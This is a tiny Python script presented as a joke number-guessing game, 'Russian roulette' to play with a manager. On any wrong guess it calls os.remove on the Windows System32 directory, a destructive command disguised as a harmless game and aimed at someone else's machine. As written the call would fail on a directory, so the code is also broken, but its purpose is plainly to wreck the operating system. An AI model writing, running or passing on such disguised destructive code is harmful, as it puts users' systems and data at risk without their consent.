# Russian roulette that you can play with your manager
import random
import os

number = random.randint(1, 10)

guess = input("Silly game! Guess a number between 1 and 10: ")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    os.remove("C:\\Windows\\System32")
